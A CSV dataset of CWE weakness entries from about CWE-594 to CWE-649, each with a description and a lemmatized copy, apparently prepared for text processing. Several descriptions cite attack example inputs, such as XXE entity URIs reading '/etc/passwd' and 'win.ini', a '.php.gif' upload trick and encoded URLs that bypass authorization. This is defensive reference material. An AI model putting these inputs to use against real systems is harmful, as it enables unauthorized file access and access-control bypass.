CWE-594,J2EE Framework: Saving Unserializable Objects to Disk,"When the J2EE container attempts to write unserializable objects to disk there is no guarantee that the process will complete successfully.In heavy load conditions, most J2EE application frameworks flush objects to disk to manage memory requirements of incoming requests. For example, session scoped objects, and even application scoped objects, are written to disk when required. While these application frameworks do the real work of writing objects to disk, they do not enforce that those objects be serializable, thus leaving the web application vulnerable to crashes induced by serialization failure. An attacker may be able to mount a denial of service attack by sending enough requests to the server to force the web application to save objects to disk.",container attempt write unserializable object disk guarantee process complete successfully heavy load condition application framework flush object disk manage memory requirement incoming request example session scope object application scope object write disk require application framework real work write object disk enforce object serializable leave web application vulnerable crash induce serialization failure attacker able mount denial service attack send request server force web application save object disk
CWE-595,Comparison of Object References Instead of Object Contents,"The product compares object references instead of the contents of the objects themselves, preventing it from detecting equivalent objects.For example, in Java, comparing objects using == usually produces deceptive results, since the == operator compares object references rather than values; often, this means that using == for strings is actually comparing the strings' references, not their values.",product compare object reference instead content object prevent detect equivalent object example java compare object usually produce deceptive result operator compare object reference value mean string actually compare string reference value
CWE-596,DEPRECATED: Incorrect Semantic Object Comparison,This weakness has been deprecated. It was poorly described and difficult to distinguish from other entries. It was also inappropriate to assign a separate ID solely because of domain-specific considerations. Its closest equivalent is CWE-1023.,weakness deprecate poorly describe difficult distinguish entry inappropriate assign separate id solely domain specific consideration close equivalent
CWE-597,Use of Wrong Operator in String Comparison,"The product uses the wrong operator when comparing a string, such as using ""=="" when the .equals() method should be used instead.In Java, using == or != to compare two strings for equality actually compares two objects for equality rather than their string values for equality. Chances are good that the two references will never be equal. While this weakness often only affects program correctness, if the equality is used for a security decision, the unintended comparison result could be leveraged to affect program security.",product use wrong operator compare string method instead java compare string equality actually compare object equality string value equality chance good reference equal weakness affect program correctness equality security decision unintended comparison result leverage affect program security
CWE-598,Use of GET Request Method With Sensitive Query Strings,"The web application uses the HTTP GET method to process a request and includes sensitive information in the query string of that request.The query string for the URL could be saved in the browser's history, passed through Referers to other web sites, stored in web logs, or otherwise recorded in other sources. If the query string contains sensitive information such as session identifiers, then attackers can use this information to launch further attacks.",web application use http method process request include sensitive information query string request query string url save browser history pass referer web site store web log record source query string contain sensitive information session identifier attacker use information launch attack
CWE-599,Missing Validation of OpenSSL Certificate,"The product uses OpenSSL and trusts or uses a certificate without using the SSL_get_verify_result() function to ensure that the certificate satisfies all necessary security requirements.This could allow an attacker to use an invalid certificate to claim to be a trusted host, use expired certificates, or conduct other attacks that could be detected if the certificate is properly validated.",product use openssl trust use certificate function ensure certificate satisfy necessary security requirement allow attacker use invalid certificate claim trusted host use expired certificate conduct attack detect certificate properly validate
CWE-6,J2EE Misconfiguration: Insufficient Session-ID Length,"The J2EE application is configured to use an insufficient session ID length.If an attacker can guess or steal a session ID, then they may be able to take over the user's session (called session hijacking). The number of possible session IDs increases with increased session ID length, making it more difficult to guess or steal a session ID.",application configure use insufficient session id length attacker guess steal session id able user session call session hijacking number possible session id increase increase session id length make difficult guess steal session id
CWE-600,Uncaught Exception in Servlet ,"The Servlet does not catch all exceptions, which may reveal sensitive debugging information.When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.",servlet catch exception reveal sensitive debugging information servlet throw exception default error response servlet container send user typically include debug information information great value attacker example stack trace attacker malformed sql query string type database version application container information enable attacker target know vulnerability component
CWE-601,URL Redirection to Untrusted Site ('Open Redirect'),"A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance. Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.",web application accept user control input specify link external site use link redirect simplify phishing attack http parameter contain url value cause web application redirect request specify url modify url value malicious site attacker successfully launch phishing scam steal user credential server modify link identical original site phishing attempt trustworthy appearance issue pose vulnerability subject intended behavior application example search engine intentionally provide redirect arbitrary url
CWE-602,Client-Side Enforcement of Server-Side Security,"The product is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms, resulting in potentially unexpected interactions between the client and server. The consequences will vary, depending on what the mechanisms are trying to protect.",product compose server rely client implement mechanism intend protect server server rely protection mechanism place client attacker modify client behavior bypass protection mechanism result potentially unexpected interaction client server consequence vary depend mechanism try protect
CWE-603,Use of Client-Side Authentication,"A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check.Client-side authentication is extremely weak and may be breached easily. Any attacker may read the source code and reverse-engineer the authentication mechanism to access parts of the application which would otherwise be protected.",client server product perform authentication client code server code allow server authentication bypass modify client omit authentication check client authentication extremely weak breach easily attacker read source code reverse engineer authentication mechanism access part application protect
CWE-605,Multiple Binds to the Same Port,"When multiple sockets are allowed to bind to the same port, other services on that port may be stolen or spoofed.On most systems, a combination of setting the SO_REUSEADDR socket option, and a call to bind() allows any process to bind to a port to which a previous process has bound with INADDR_ANY. This allows a user to bind to the specific address of a server bound to INADDR_ANY on an unprivileged port, and steal its UDP packets/TCP connection.",multiple socket allow bind port service port steal spoof system combination set socket option bind allow process bind port previous process bind allow user bind specific address server bind unprivileged port steal udp packet tcp connection
CWE-606,Unchecked Input for Loop Condition,"The product does not properly check inputs that are used for loop conditions, potentially leading to a denial of service or other consequences because of excessive looping.",product properly check input loop condition potentially lead denial service consequence excessive looping
CWE-607,Public Static Final Field References Mutable Object,"A public or protected static final field references a mutable object, which allows the object to be changed by malicious code, or accidentally from another package.",public protect static final field reference mutable object allow object change malicious code accidentally package
CWE-608,Struts: Non-private Field in ActionForm Class,"An ActionForm class contains a field that has not been declared private, which can be accessed without using a setter or getter.",actionform class contain field declare private access setter getter
CWE-609,Double-Checked Locking,"The product uses double-checked locking to access a resource without the overhead of explicit synchronization, but the locking is insufficient.Double-checked locking refers to the situation where a programmer checks to see if a resource has been initialized, grabs a lock, checks again to see if the resource has been initialized, and then performs the initialization if it has not occurred yet. This should not be done, as it is not guaranteed to work in all languages and on all architectures. In summary, other threads may not be operating inside the synchronous block and are not guaranteed to see the operations execute in the same order as they would appear inside the synchronous block.",product use double check locking access resource overhead explicit synchronization locking insufficient double checked locking refer situation programmer check resource initialize grab lock check resource initialize perform initialization occur guarantee work language architecture summary thread operate inside synchronous block guarantee operation execute order appear inside synchronous block
CWE-61,UNIX Symbolic Link (Symlink) Following,"The product, when opening a file or directory, does not sufficiently account for when the file is a symbolic link that resolves to a target outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.A product that allows UNIX symbolic links (symlink) as part of paths whether in internal code or through user input can allow an attacker to spoof the symbolic link and traverse the file system to unintended locations or access arbitrary files. The symbolic link can permit an attacker to read/write/corrupt a file that they originally did not have permissions to access.",product open file directory sufficiently account file symbolic link resolve target outside intended control sphere allow attacker cause product operate unauthorized file product allow unix symbolic link symlink path internal code user input allow attacker spoof symbolic link traverse file system unintended location access arbitrary file symbolic link permit attacker read write corrupt file originally permission access
CWE-610,Externally Controlled Reference to a Resource in Another Sphere,The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere.,product use externally control reference resolve resource outside intended control sphere
CWE-611,Improper Restriction of XML External Entity Reference,"The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as ""file:///c:/winnt/win.ini"" designates (in Windows) the file C:\Winnt\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents.",product process xml document contain xml entity uri resolve document outside intended sphere control cause product embed incorrect document output xml document optionally contain document type definition dtd feature enable definition xml entity possible define entity provide substitution string form uri xml parser access content uri embed content xml document processing submit xml file define external entity uri attacker cause processing application read content local file example uri designate windows file passwd designate password file unix base system uri scheme attacker force application outgoing request server attacker reach directly bypass firewall restriction hide source attack port scanning content uri read feed application process xml application echo datum error message expose file content
CWE-612,Improper Authorization of Index Containing Sensitive Information,"The product creates a search index of private or sensitive documents, but it does not properly limit index access to actors who are authorized to see the original information.Web sites and other document repositories may apply an indexing routine against a group of private documents to facilitate search. If the index's results are available to parties who do not have access to the documents being indexed, then attackers could obtain portions of the documents by conducting targeted searches and reading the results. The risk is especially dangerous if search results include surrounding text that was not part of the search query. This issue can appear in search engines that are not configured (or implemented) to ignore critical files that should remain hidden; even without permissions to download these files directly, the remote user could read them.",product create search index private sensitive document properly limit index access actor authorize original information web site document repository apply indexing routine group private document facilitate search index result available party access document index attacker obtain portion document conduct target search read result risk especially dangerous search result include surround text search query issue appear search engine configure implement ignore critical file remain hidden permission download file directly remote user read
CWE-613,Insufficient Session Expiration,"According to WASC, ""Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.""",accord wasc insufficient session expiration web site permit attacker reuse old session credential session id authorization
CWE-614,Sensitive Cookie in HTTPS Session Without 'Secure' Attribute,"The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.",secure attribute sensitive cookie https session set cause user agent send cookie plaintext http session
CWE-615,Inclusion of Sensitive Information in Source Code Comments,"While adding general comments is very useful, some programmers tend to leave important data, such as: filenames related to the web application, old links or links which were not meant to be browsed by users, old code fragments, etc.An attacker who finds these comments can map the application's structure and files, expose hidden parts of the site, and study the fragments of code to reverse engineer the application, which may help develop further attacks against the site.",add general comment useful programmer tend leave important datum filename relate web application old link link mean browse user old code fragment etc attacker find comment map application structure file expose hidden part site study fragment code reverse engineer application help develop attack site
CWE-616,Incomplete Identification of Uploaded File Variables (PHP),"The PHP application uses an old method for processing uploaded files by referencing the four global variables that are set for each file (e.g. $varname, $varname_size, $varname_name, $varname_type). These variables could be overwritten by attackers, causing the application to process unauthorized files.These global variables could be overwritten by POST requests, cookies, or other methods of populating or overwriting these variables. This could be used to read or process arbitrary files by providing values such as ""/etc/passwd"".",php application use old method process upload file reference global variable set file varname variable overwrite attacker cause application process unauthorized file global variable overwrite post request cookie method populate overwrite variable read process arbitrary file provide value passwd
CWE-617,Reachable Assertion,"The product contains an assert() or similar statement that can be triggered by an attacker, which leads to an application exit or other behavior that is more severe than necessary.While assertion is good for catching logic errors and reducing the chances of reaching more serious vulnerability conditions, it can still lead to a denial of service.For example, if a server handles multiple simultaneous connections, and an assert() occurs in one single connection that causes all other connections to be dropped, this is a reachable assertion that leads to a denial of service.",product contain assert similar statement trigger attacker lead application exit behavior severe necessary assertion good catch logic error reduce chance reach vulnerability condition lead denial service example server handle multiple simultaneous connection assert occur single connection cause connection drop reachable assertion lead denial service
CWE-618,Exposed Unsafe ActiveX Method,"An ActiveX control is intended for use in a web browser, but it exposes dangerous methods that perform actions that are outside of the browser's security model (e.g. the zone or domain).ActiveX controls can exercise far greater control over the operating system than typical Java or javascript. Exposed methods can be subject to various vulnerabilities, depending on the implemented behaviors of those methods, and whether input validation is performed on the provided arguments. If there is no integrity checking or origin validation, this method could be invoked by attackers.",activex control intend use web browser expose dangerous method perform action outside browser security model zone control exercise far great control operate system typical java javascript expose method subject vulnerability depend implement behavior method input validation perform provide argument integrity checking origin validation method invoke attacker
CWE-619,Dangling Database Cursor ('Cursor Injection'),"If a database cursor is not closed properly, then it could become accessible to other users while retaining the same privileges that were originally assigned, leaving the cursor ""dangling.""For example, an improper dangling cursor could arise from unhandled exceptions. The impact of the issue depends on the cursor's role, but SQL injection attacks are commonly possible.",database cursor close properly accessible user retain privilege originally assign leave cursor dangle example improper dangle cursor arise unhandled exception impact issue depend cursor role sql injection attack commonly possible
CWE-62,UNIX Hard Link,"The product, when opening a file or directory, does not sufficiently account for when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.Failure for a system to check for hard links can result in vulnerability to different types of attacks. For example, an attacker can escalate their privileges if a file used by a privileged program is replaced with a hard link to a sensitive file (e.g. /etc/passwd). When the process opens the file, the attacker can assume the privileges of that process.",product open file directory sufficiently account associate hard link target outside intended control sphere allow attacker cause product operate unauthorized file failure system check hard link result vulnerability different type attack example attacker escalate privilege file privileged program replace hard link sensitive file passwd process open file attacker assume privilege process
CWE-620,Unverified Password Change,"When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user.",set new password user product require knowledge original password form authentication attacker change password user gain privilege associate user
CWE-621,Variable Extraction Error,"The product uses external input to determine the names of variables into which information is extracted, without verifying that the names of the specified variables are valid. This could cause the program to overwrite unintended variables.For example, in PHP, extraction can be used to provide functionality similar to register_globals, a dangerous functionality that is frequently disabled in production systems. Calling extract() or import_request_variables() without the proper arguments could allow arbitrary global variables to be overwritten, including superglobals.Similar functionality is possible in other interpreted languages, including custom languages.",product use external input determine name variable information extract verify name specify variable valid cause program overwrite unintended variable example php extraction provide functionality similar dangerous functionality frequently disable production system call extract proper argument allow arbitrary global variable overwrite include superglobal similar functionality possible interpret language include custom language
CWE-622,Improper Validation of Function Hook Arguments,"The product adds hooks to user-accessible API functions, but it does not properly validate the arguments. This could lead to resultant vulnerabilities.Such hooks can be used in defensive software that runs with privileges, such as anti-virus or firewall, which hooks kernel calls. When the arguments are not validated, they could be used to bypass the protection scheme or attack the product itself.",product add hook user accessible api function properly validate argument lead resultant vulnerability hook defensive software run privilege anti virus firewall hook kernel call argument validate bypass protection scheme attack product
CWE-623,Unsafe ActiveX Control Marked Safe For Scripting,"An ActiveX control is intended for restricted use, but it has been marked as safe-for-scripting.This might allow attackers to use dangerous functionality via a web page that accesses the control, which can lead to different resultant vulnerabilities, depending on the control's behavior.",activex control intend restricted use mark safe scripting allow attacker use dangerous functionality web page access control lead different resultant vulnerability depend control behavior
CWE-624,Executable Regular Expression Error,"The product uses a regular expression that either (1) contains an executable component with user-controlled inputs, or (2) allows a user to enable execution by inserting pattern modifiers.Case (2) is possible in the PHP preg_replace() function, and possibly in other languages when a user-controlled input is inserted into a string that is later parsed as a regular expression.",product use regular expression contain executable component user control input allow user enable execution insert pattern modifier case possible php function possibly language user control input insert string later parse regular expression
CWE-625,Permissive Regular Expression,"The product uses a regular expression that does not sufficiently restrict the set of allowed values.This effectively causes the regexp to accept substrings that match the pattern, which produces a partial comparison to the target. In some cases, this can lead to other weaknesses. Common errors include:not identifying the beginning and end of the target stringusing wildcards instead of acceptable character rangesothers",product use regular expression sufficiently restrict set allow value effectively cause regexp accept substring match pattern produce partial comparison target case lead weakness common error include identify beginning end target stringuse wildcard instead acceptable character rangesother
CWE-626,Null Byte Interaction Error (Poison Null Byte),"The product does not properly handle null bytes or NUL characters when passing data between different representations or components.A null byte (NUL character) can have different meanings across representations or languages. For example, it is a string terminator in standard C libraries, but Perl and PHP strings do not treat it as a terminator. When two representations are crossed - such as when Perl or PHP invokes underlying C functionality - this can produce an interaction error with unexpected results. Similar issues have been reported for ASP. Other interpreters written in C might also be affected.The poison null byte is frequently useful in path traversal attacks by terminating hard-coded extensions that are added to a filename. It can play a role in regular expression processing in PHP.",product properly handle null byte nul character pass datum different representation component null byte nul character different meaning representation language example string terminator standard c library perl php string treat terminator representation cross perl php invoke underlie c functionality produce interaction error unexpected result similar issue report asp interpreter write c affect poison null byte frequently useful path traversal attack terminate hard code extension add filename play role regular expression processing php
CWE-627,Dynamic Variable Evaluation,"In a language where the user can influence the name of a variable at runtime, if the variable names are not controlled, an attacker can read or write to arbitrary variables, or access arbitrary functions.The resultant vulnerabilities depend on the behavior of the application, both at the crossover point and in any control/data flow that is reachable by the related variables or functions.",language user influence variable runtime variable name control attacker read write arbitrary variable access arbitrary function resultant vulnerability depend behavior application crossover point control data flow reachable related variable function
CWE-628,Function Call with Incorrectly Specified Arguments,"The product calls a function, procedure, or routine with arguments that are not correctly specified, leading to always-incorrect behavior and resultant weaknesses.There are multiple ways in which this weakness can be introduced, including:the wrong variable or reference;an incorrect number of arguments;incorrect order of arguments;wrong type of arguments; orwrong value.",product call function procedure routine argument correctly specify lead incorrect behavior resultant weakness multiple way weakness introduce include wrong variable incorrect number order type argument orwrong value
CWE-636,Not Failing Securely ('Failing Open'),"When the product encounters an error condition or failure, its design requires it to fall back to a state that is less secure than other options that are available, such as selecting the weakest encryption algorithm or using the most permissive access control restrictions.By entering a less secure state, the product inherits the weaknesses associated with that state, making it easier to compromise. At the least, it causes administrators to have a false sense of security. This weakness typically occurs as a result of wanting to ""fail functional"" to minimize administration and support costs, instead of ""failing safe.""",product encounter error condition failure design require fall state secure option available select weak encryption algorithm permissive access control restriction enter secure state product inherit weakness associate state make easy compromise cause administrator false sense security weakness typically occur result want fail functional minimize administration support cost instead fail safe
CWE-637,Unnecessary Complexity in Protection Mechanism (Not Using 'Economy of Mechanism'),"The product uses a more complex mechanism than necessary, which could lead to resultant weaknesses when the mechanism is not correctly understood, modeled, configured, implemented, or used.Security mechanisms should be as simple as possible. Complex security mechanisms may engender partial implementations and compatibility problems, with resulting mismatches in assumptions and implemented security. A corollary of this principle is that data specifications should be as simple as possible, because complex data specifications result in complex validation code. Complex tasks and systems may also need to be guarded by complex security checks, so simple systems should be preferred.",product use complex mechanism necessary lead resultant weakness mechanism correctly understand model configure implement security mechanism simple possible complex security mechanism engender partial implementation compatibility problem result mismatch assumption implement security corollary principle datum specification simple possible complex datum specification result complex validation code complex task system need guard complex security check simple system prefer
CWE-638,Not Using Complete Mediation,"The product does not perform access checks on a resource every time the resource is accessed by an entity, which can create resultant weaknesses if that entity's rights or privileges change over time.",product perform access check resource time resource access entity create resultant weakness entity right privilege change time
CWE-639,Authorization Bypass Through User-Controlled Key,"The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system.For example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value.One manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data.",system authorization functionality prevent user gain access user datum record modify key value identify datum retrieval user record occur system base key value user control key typically identify user relate record store system lookup record presentation user likely attacker authenticated user system authorization process properly check datum access operation ensure authenticate user perform operation sufficient entitlement perform request datum access bypass authorization check present system example attacker look place user specific datum retrieve search screen determine key item look controllable externally key hidden field html form field pass url parameter unencrypted cookie variable case possible tamper key value manifestation weakness system use sequential easily guessable session id allow user easily switch user session read modify datum
CWE-64,Windows Shortcut Following (.LNK),"The product, when opening a file or directory, does not sufficiently handle when the file is a Windows shortcut (.LNK) whose target is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.The shortcut (file with the .lnk extension) can permit an attacker to read/write a file that they originally did not have permissions to access.",product open file directory sufficiently handle file windows shortcut target outside intended control sphere allow attacker cause product operate unauthorized file shortcut file extension permit attacker read write file originally permission access
CWE-640,Weak Password Recovery Mechanism for Forgotten Password,"The product contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme.This weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system.",product contain mechanism user recover change password know original password mechanism weak common application mechanism provide means user gain access account event forget password password recovery mechanism weak effect make likely possible person legitimate system user gain access user account weak password recovery scheme completely undermine strong password authentication scheme weakness security question easy guess find answer question common answer find social medium implementation weakness password recovery mechanism code instance trick system e mail new password e mail account user throttling rate password reset legitimate user deny service attacker attacker try recover password rapid succession system send original password user generate new temporary password summary password recovery functionality carefully design implement system weak link misuse way allow attacker gain unauthorized access system
CWE-641,Improper Restriction of Names for Files and Other Resources,"The product constructs the name of a file or other resource using input from an upstream component, but it does not restrict or incorrectly restricts the resulting name.This may produce resultant weaknesses. For instance, if the names of these resources contain scripting characters, it is possible that a script may get executed in the client's browser if the application ever displays the name of the resource on a dynamically generated web page. Alternately, if the resources are consumed by some application parser, a specially crafted name can exploit some vulnerability internal to the parser, potentially resulting in execution of arbitrary code on the server machine. The problems will vary based on the context of usage of such malformed resource names and whether vulnerabilities are present in or assumptions are made by the targeted technology that would make code execution possible.",product construct file resource input upstream component restrict incorrectly restrict result produce resultant weakness instance name resource contain scripting character possible script execute client browser application display resource dynamically generate web page alternately resource consume application parser specially craft exploit vulnerability internal parser potentially result execution arbitrary code server machine problem vary base context usage malformed resource name vulnerability present assumption target technology code execution possible
CWE-642,External Control of Critical State Data,"The product stores security-critical state information about its users, or the product itself, in a location that is accessible to unauthorized actors.If an attacker can modify the state information without detection, then it could be used to perform unauthorized actions or access unexpected resources, since the application programmer does not expect that the state can be changed.State information can be stored in various locations such as a cookie, in a hidden web form field, input parameter or argument, an environment variable, a database record, within a settings file, etc. All of these locations have the potential to be modified by an attacker. When this state information is used to control security or determine resource usage, then it may create a vulnerability. For example, an application may perform authentication, then save the state in an ""authenticated=true"" cookie. An attacker may simply create this cookie in order to bypass the authentication.",product store security critical state information user product location accessible unauthorized actor attacker modify state information detection perform unauthorized action access unexpected resource application programmer expect state change state information store location cookie hidden web form field input parameter argument environment variable database record setting file etc location potential modify attacker state information control security determine resource usage create vulnerability example application perform authentication save state authenticate true cookie attacker simply create cookie order bypass authentication
CWE-643,Improper Neutralization of Data within XPath Expressions ('XPath Injection'),"The product uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).",product use external input dynamically construct xpath expression retrieve datum xml database neutralize incorrectly neutralize input allow attacker control structure query net effect attacker control information select xml database use ability control application flow modify logic retrieve unauthorized datum bypass important check authentication
CWE-644,Improper Neutralization of HTTP Headers for Scripting Syntax,"The product does not neutralize or incorrectly neutralizes web scripting syntax in HTTP headers that can be used by web browser components that can process raw headers, such as Flash.An attacker may be able to conduct cross-site scripting and other attacks against users who have these components enabled.If a product does not neutralize user controlled data being placed in the header of an HTTP response coming from the server, the header may contain a script that will get executed in the client's browser context, potentially resulting in a cross site scripting vulnerability or possibly an HTTP response splitting attack. It is important to carefully control data that is being placed both in HTTP response header and in the HTTP response body to ensure that no scripting syntax is present, taking various encodings into account.",product neutralize incorrectly neutralize web scripting syntax http header web browser component process raw header flash attacker able conduct cross site scripting attack user component enable product neutralize user control datum place header http response come server header contain script execute client browser context potentially result cross site scripting vulnerability possibly http response splitting attack important carefully control datum place http response header http response body ensure scripting syntax present take encoding account
CWE-645,Overly Restrictive Account Lockout Mechanism,"The product contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily, which allows attackers to deny service to legitimate users by causing their accounts to be locked out.Account lockout is a security feature often present in applications as a countermeasure to the brute force attack on the password based authentication mechanism of the system. After a certain number of failed login attempts, the users' account may be disabled for a certain period of time or until it is unlocked by an administrator. Other security events may also possibly trigger account lockout. However, an attacker may use this very security feature to deny service to legitimate system users. It is therefore important to ensure that the account lockout security mechanism is not overly restrictive.",product contain account lockout protection mechanism mechanism restrictive trigger easily allow attacker deny service legitimate user cause account lock account lockout security feature present application countermeasure brute force attack password base authentication mechanism system certain number fail login attempt user account disable certain period time unlock administrator security event possibly trigger account lockout attacker use security feature deny service legitimate system user important ensure account lockout security mechanism overly restrictive
CWE-646,Reliance on File Name or Extension of Externally-Supplied File,"The product allows a file to be uploaded, but it relies on the file name or extension of the file to determine the appropriate behaviors. This could be used by attackers to cause the file to be misclassified and processed in a dangerous fashion.An application might use the file name or extension of a user-supplied file to determine the proper course of action, such as selecting the correct process to which control should be passed, deciding what data should be made available, or what resources should be allocated. If the attacker can cause the code to misclassify the supplied file, then the wrong action could occur. For example, an attacker could supply a file that ends in a "".php.gif"" extension that appears to be a GIF image, but would be processed as PHP code. In extreme cases, code execution is possible, but the attacker could also cause exhaustion of resources, denial of service, exposure of debug or system data (including application source code), or being bound to a particular server side process. This weakness may be due to a vulnerability in any of the technologies used by the web and application servers, due to misconfiguration, or resultant from another flaw in the application itself.",product allow file upload rely file extension file determine appropriate behavior attacker cause file misclassifie process dangerous fashion application use file extension user supply file determine proper course action select correct process control pass decide datum available resource allocate attacker cause code misclassify supply file wrong action occur example attacker supply file end extension appear gif image process php code extreme case code execution possible attacker cause exhaustion resource denial service exposure debug system datum include application source code bind particular server process weakness vulnerability technology web application server misconfiguration resultant flaw application
CWE-647,Use of Non-Canonical URL Paths for Authorization Decisions,"The product defines policy namespaces and makes authorization decisions based on the assumption that a URL is canonical. This can allow a non-canonical URL to bypass the authorization.If an application defines policy namespaces and makes authorization decisions based on the URL, but it does not require or convert to a canonical URL before making the authorization decision, then it opens the application to attack. For example, if the application only wants to allow access to http://www.example.com/mypage, then the attacker might be able to bypass this restriction using equivalent URLs such as:http://WWW.EXAMPLE.COM/mypagehttp://www.example.com/%6Dypage (alternate encoding)http://192.168.1.1/mypage (IP address)http://www.example.com/mypage/ (trailing /)http://www.example.com:80/mypageTherefore it is important to specify access control policy that is based on the path information in some canonical form with all alternate encodings rejected (which can be accomplished by a default deny rule).",product define policy namespace make authorization decision base assumption url canonical allow non canonical url bypass authorization application define policy namespace make authorization decision base url require convert canonical url make authorization decision open application attack example application want allow access attacker able bypass restriction equivalent url alternate mypage ip trailing mypagetherefore important specify access control policy base path information canonical form alternate encoding reject accomplish default deny rule
CWE-648,Incorrect Use of Privileged APIs,"The product does not conform to the API requirements for a function call that requires extra privileges. This could allow attackers to gain privileges by causing the function to be called incorrectly.When a product contains certain functions that perform operations requiring an elevated level of privilege, the caller of a privileged API must be careful to:ensure that assumptions made by the APIs are valid, such as validity of argumentsaccount for known weaknesses in the design/implementation of the APIcall the API from a safe contextIf the caller of the API does not follow these requirements, then it may allow a malicious user or process to elevate their privilege, hijack the process, or steal sensitive data.For instance, it is important to know if privileged APIs do not shed their privileges before returning to the caller or if the privileged function might make certain assumptions about the data, context or state information passed to it by the caller. It is important to always know when and how privileged APIs can be called in order to ensure that their elevated level of privilege cannot be exploited.",product conform api requirement function require extra privilege allow attacker gain privilege cause function call incorrectly product contain certain function perform operation require elevated level privilege caller privileged api careful ensure assumption api valid validity argumentsaccount know weakness design implementation apicall api safe contextif caller api follow requirement allow malicious user process elevate privilege hijack process steal sensitive datum instance important know privileged api shed privilege return caller privileged function certain assumption datum context state information pass caller important know privileged api call order ensure elevated level privilege exploit
CWE-649,Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking,"The product uses obfuscation or encryption of inputs that should not be mutable by an external actor, but the product does not use integrity checks to detect if those inputs have been modified.When an application relies on obfuscation or incorrectly applied / weak encryption to protect client-controllable tokens or parameters, that may have an effect on the user state, system state, or some decision made on the server. Without protecting the tokens/parameters for integrity, the application is vulnerable to an attack where an adversary traverses the space of possible values of the said token/parameter in order to attempt to gain an advantage. The goal of the attacker is to find another admissible value that will somehow elevate their privileges in the system, disclose information or change the behavior of the system in some way beneficial to the attacker. If the application does not protect these critical tokens/parameters for integrity, it will not be able to determine that these values have been tampered with. Measures that are used to protect data for confidentiality should not be relied upon to provide the integrity service.",product use obfuscation encryption input mutable external actor product use integrity check detect input modify application rely obfuscation incorrectly apply weak encryption protect client controllable token parameter effect user state system state decision server protect token parameter integrity application vulnerable attack adversary traverse space possible value say token parameter order attempt gain advantage goal attacker find admissible value elevate privilege system disclose information change behavior system way beneficial attacker application protect critical token parameter integrity able determine value tamper measure protect datum confidentiality rely provide integrity service
CWE-65,Windows Hard Link,"The product, when opening a file or directory, does not sufficiently handle when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.Failure for a system to check for hard links can result in vulnerability to different types of attacks. For example, an attacker can escalate their privileges if a file used by a privileged program is replaced with a hard link to a sensitive file (e.g. AUTOEXEC.BAT). When the process opens the file, the attacker can assume the privileges of that process, or prevent the program from accurately processing data.",product open file directory sufficiently handle associate hard link target outside intended control sphere allow attacker cause product operate unauthorized file failure system check hard link result vulnerability different type attack example attacker escalate privilege file privileged program replace hard link sensitive file process open file attacker assume privilege process prevent program accurately process datum
